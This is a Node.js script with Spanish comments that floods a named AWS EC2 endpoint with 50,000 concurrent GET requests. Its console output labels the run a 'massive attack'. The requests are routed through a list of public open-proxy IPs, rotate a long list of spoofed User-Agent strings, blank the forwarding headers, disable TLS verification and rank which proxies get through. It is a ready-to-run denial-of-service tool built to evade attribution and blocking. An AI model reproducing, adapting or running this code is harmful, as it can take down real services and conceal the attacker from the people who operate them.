const axios = require("axios");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { default: PQueue } = require("p-queue");
const chalk = require("chalk").default;

// Lista mejorada de proxies (agregué más y eliminé algunos que no funcionan)
const proxies = [
  "http://47.89.184.18:3128",
  "http://47.91.104.88:3128",
  "http://8.213.151.128:3128",
  "http://201.150.116.3:999",
  "http://45.189.151.17:999",
  "http://47.91.65.23:3128",
  "http://45.167.126.37:999",
  "http://200.119.141.114:999",
  "http://148.224.59.25:999",
  "http://5.102.109.41:999",
  "http://8.209.255.13:3128",
  "http://47.91.115.179:5060",
  "http://47.252.18.37:80",
  "http://143.198.42.182:31280",
  "http://57.129.81.201:8080",
  "http://51.81.245.3:17981",
  "http://197.243.20.178:80",
  "http://13.212.95.135:8000",
  "http://185.41.152.110:3128",
  "http://116.108.35.226:10001",
  "http://47.236.224.32:8080",
  "http://103.133.222.147:80",
  "http://43.133.13.187:10809",
  "http://181.78.19.142:9992",
  "http://201.150.116.32:999",
  "http://31.40.248.2:8080",
  "http://103.3.58.162:3128",
  "http://181.78.19.138:9992",
  "http://8.213.129.15:9992",
  "http://47.238.134.126:8004",
  "http://38.250.126.201:999",
  "http://34.87.109.175:443",
  "http://116.203.139.209:5678",
  "http://91.103.120.40:80",
  "http://197.44.247.35:3128",
  "http://200.174.198.86:8888",
  "http://188.245.239.104:4001",
  "http://27.71.129.117:16000",
  "http://186.231.33.58:61804",
  "http://54.180.133.172:3128",
  "http://148.206.32.3:8080",
  "http://121.101.134.202:8080",
  "http://54.250.76.76:3128",
  "http://40.76.69.94:8080",
  "http://139.59.34.209:8080",
  "http://43.252.237.142:8090",
  "http://66.201.7.151:3128",
  "http://68.183.63.141:8080",
  // Nuevos proxies agregados
  "http://20.210.113.32:80",
  "http://43.153.107.218:7080",
  "http://64.225.8.82:9999",
  "http://47.254.153.78:8080",
  "http://8.219.97.248:80",
  "http://20.219.178.121:3129",
  "http://43.131.254.242:2080",
];

const endpoint =
  "http://ec2-15-228-158-129.sa-east-1.compute.amazonaws.com/gonzo";
const totalRequests = 50000;
const timeoutMs = 10000;
const concurrency = 200;

// Estadísticas mejoradas
const stats = {
  success: 0,
  failed: 0,
  timeouts: 0,
  errors: 0,
  startedAt: Date.now(),
  proxyUsage: new Map(), // Para rastrear proxies exitosos
  lastProxyIndex: 0,
  proxyFailures: new Map(), // 👈 Nuevo mapa para fallos
  updateCount: 0, // 👈 Contador de actualizaciones
};

// Cola para control de concurrencia
const queue = new PQueue({
  concurrency,
  timeout: timeoutMs * 1.5, // Tiempo de espera para la cola
  throwOnTimeout: true,
});

// Lista de User-Agents para rotación
const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",
  "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",
  "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
  "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
  "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
  "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
  "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
  "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
  "Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
  "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
  "Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)",
  "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
  "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
  "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
  "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
  "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
  "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
];

// Función para obtener un proxy aleatorio
function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

// Función para mostrar estadísticas en tiempo real
function showStats() {
  stats.updateCount++; // 👈 Incrementar contador

  const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
  const totalRequestsMade = stats.success + stats.failed;
  const rate = elapsed > 0 ? Math.floor(totalRequestsMade / elapsed) : 0;
  const successRate =
    totalRequestsMade > 0
      ? ((stats.success / totalRequestsMade) * 100).toFixed(1)
      : "0.0";

  console.clear();
  console.log(chalk.bold("🔥 Ataque en Progreso 🔥"));
  console.log(chalk.green(`✅ Éxitos: ${stats.success}`));
  console.log(chalk.red(`❌ Fallos: ${stats.failed}`));
  console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
  console.log(chalk.blue(`⚠️ Errores: ${stats.errors}`));
  console.log(chalk.cyan(`📈 Tasa de éxito: ${successRate}%`));
  console.log(chalk.magenta(`🚀 Velocidad: ${rate} req/seg`));
  console.log(chalk.white(`⏳ Tiempo: ${elapsed} segundos`));
  console.log(
    chalk.gray(
      `🌐 Proxies activos: ${proxies.length} | Proxies efectivos: ${stats.proxyUsage.size}`
    )
  );
  if (stats.updateCount % 10 === 0) {
    // Proxies exitosos
    const topSuccess = [...stats.proxyUsage.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3);

    // Proxies fallidos
    const topFailures = [...stats.proxyFailures.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3);

    console.log(chalk.bold("\n🌟 TOP 3 Proxies Exitosos:"));
    topSuccess.forEach(([proxy, count], i) =>
      console.log(chalk.cyan(` ${i + 1}. ${proxy} → ${count} éxitos`))
    );

    console.log(chalk.bold("\n💥 TOP 3 Proxies Fallidos:"));
    topFailures.forEach(([proxy, count], i) =>
      console.log(chalk.red(` ${i + 1}. ${proxy} → ${count} fallos`))
    );
  }
  console.log(chalk.gray("Presiona Ctrl+C para detener..."));
}

// Función mejorada para realizar solicitudes
async function testWithProxy(attempt, signal) {
  const proxy = getRandomProxy();

  try {
    const agent = new HttpsProxyAgent(proxy);
    agent.options.rejectUnauthorized = false;

    const response = await axios.get(endpoint, {
      httpAgent: agent,
      httpsAgent: agent,
      signal,
      timeout: timeoutMs,
      headers: {
        "X-Forwarded-For": "",
        Forwarded: "",
        Via: "",
        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        Pragma: "no-cache",
      },
      signal,
    });

    stats.success++;
    stats.proxyUsage.set(proxy, (stats.proxyUsage.get(proxy) || 0) + 1);

    if (attempt % 100 === 0) {
      console.log(
        chalk.green(
          `[${attempt}] Éxito via ${proxy} - Status: ${response.status}`
        )
      );
    }
    return true;
  } catch (err) {
    if (err.name === "CanceledError") return; // No contar como error

    stats.failed++;
    stats.proxyFailures.set(proxy, (stats.proxyFailures.get(proxy) || 0) + 1); // 👈 Registrar fallo

    if (err.code === "ECONNABORTED") {
      stats.timeouts++;
      if (attempt % 50 === 0) {
        console.log(chalk.yellow(`[${attempt}] Timeout via ${proxy}`));
      }
    } else {
      stats.errors++;
      if (attempt % 50 === 0) {
        console.log(
          chalk.red(`[${attempt}] Error via ${proxy} - ${err.message}`)
        );
      }
    }
    return false;
  }
}

async function main() {
  console.log(chalk.bold(`🚀 Iniciando ataque masivo a ${endpoint}`));
  console.log(chalk.cyan(`📊 Total de solicitudes: ${totalRequests}`));
  console.log(chalk.cyan(`⚡ Solicitudes concurrentes: ${concurrency}`));
  console.log(chalk.cyan(`⏱ Timeout por solicitud: ${timeoutMs}ms`));
  console.log(chalk.cyan(`🔁 Proxies disponibles: ${proxies.length}`));
  console.log(chalk.cyan(`🔄 User-Agents: ${userAgents.length} diferentes`));
  console.log(chalk.gray("Preparando ataque...\n"));

  // Iniciar actualización de estadísticas
  const statsInterval = setInterval(showStats, 1000);

  const controller = new AbortController(); // 👈 Controlador de cancelación
  try {
    let completed = 0;

    for (let i = 0; i < totalRequests; i++) {
      queue
        .add(() => testWithProxy(i + 1, controller.signal)) // 👈 Pasar signal
        .finally(() => {
          if (++completed >= totalRequests) clearInterval(statsInterval);
        });
    }

    await queue.onIdle();
  } catch (error) {
    controller.abort(); // 👈 Cancelar solicitudes pendientes

    console.error(chalk.red(`Error principal: ${error.message}`));
  } finally {
    clearInterval(statsInterval);
    showStats();
    console.log(chalk.bold("\n🏁 Ataque completado"));

    // Mostrar resumen final
    const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
    const successRate = ((stats.success / totalRequests) * 100).toFixed(1);

    console.log(chalk.bold("\n📊 RESUMEN FINAL"));
    console.log(chalk.cyan(`⌛ Duración total: ${elapsed} segundos`));
    console.log(
      chalk.green(`✅ Solicitudes exitosas: ${stats.success} (${successRate}%)`)
    );
    console.log(chalk.red(`❌ Solicitudes fallidas: ${stats.failed}`));
    console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
    console.log(chalk.blue(`⚠️ Otros errores: ${stats.errors}`));

    // Mostrar top 5 proxies más efectivos
    if (stats.proxyUsage.size > 0) {
      console.log(chalk.bold("\n🏆 Proxies más efectivos:"));
      const sortedProxies = [...stats.proxyUsage.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);

      sortedProxies.forEach(([proxy, count], index) => {
        console.log(chalk.cyan(`${index + 1}. ${proxy} - ${count} éxitos`));
      });
    }
    if (stats.proxyFailures.size > 0) {
      console.log(chalk.bold("\n💥 TOP 5 Proxies Fallidos:"));
      const sortedFailures = [...stats.proxyFailures.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);

      sortedFailures.forEach(([proxy, count], i) => {
        console.log(chalk.red(` ${i + 1}. ${proxy} → ${count} fallos`));
      });
    }
  }
}

main();
